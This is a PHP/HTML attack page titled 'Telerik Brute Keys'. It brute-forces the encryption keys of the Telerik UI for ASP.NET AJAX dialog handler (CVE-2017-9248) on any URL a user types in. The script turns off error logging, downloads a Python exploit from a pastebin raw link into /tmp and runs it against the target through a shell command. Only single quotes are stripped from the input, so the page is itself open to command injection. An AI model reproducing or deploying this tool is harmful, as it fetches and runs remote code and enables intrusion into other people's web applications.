<html>
<head>
<title>[+] Telerik Brute Keys [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white" onload="ascii();"><center>
  <style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: #1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: #1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}
.courier {
  font-family: Courier;
}
.notvuln {
  color: red;
}
.vuln {
  color: green;
}
</style>
<form method="post" enctype="multipart/form-data">
<font face=courier size=5>Telerik Brute Keys<br>
  <font size="3">CVE-2017-9248 (Telerik UI for ASP.NET AJAX dialog handler)</font></font><hr>
<font face=courier>Url : &nbsp;
<input type="text" size="40" name="url" class="courier" placeholder="https://exploits.my.id/../../../DialogHandler.aspx">&nbsp;
<input type="submit" name="startbf" value="Gaskan">
</form><br>
<?php
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$url = str_replace("'", "", $_POST['url']);

if (!file_exists("/tmp/tempku")) {
  mkdir("/tmp/tempku");
}

if (!file_exists("/tmp/tempku/brutekeys.py")) {
  $mek=file_get_contents("https://pastebin.com/raw/ghuQ6dwT");file_put_contents("/tmp/tempku/brutekeys.py", $mek);
}

if ($url) {
  echo "<hr><pre style='text-align: left; white-space: pre-line;'>";
  if (substr($url, -4) == "aspx") {} else {
  echo "Akhiran Url Harus .aspx\nHadeh Ente Wkwk";
  echo "<hr></pre><font size=3>Unknown45 - 2021</font>";
  exit();
}
    ob_implicit_flush(true);
    ob_end_flush();

    $a = popen("python2 /tmp/tempku/brutekeys.py -exploit '".$url."' 48 hex 9", 'r'); 
    while($b = fgets($a, 1024)) { 
        echo str_replace("", "", $b);
    }

    pclose($a); 
echo '</pre>';
  //passthru("python2 brutekeys.py -exploit '".$url."' 48 hex 9");
}
echo "</pre><hr><font size=3>Unknown45 - 2021</font>";
?>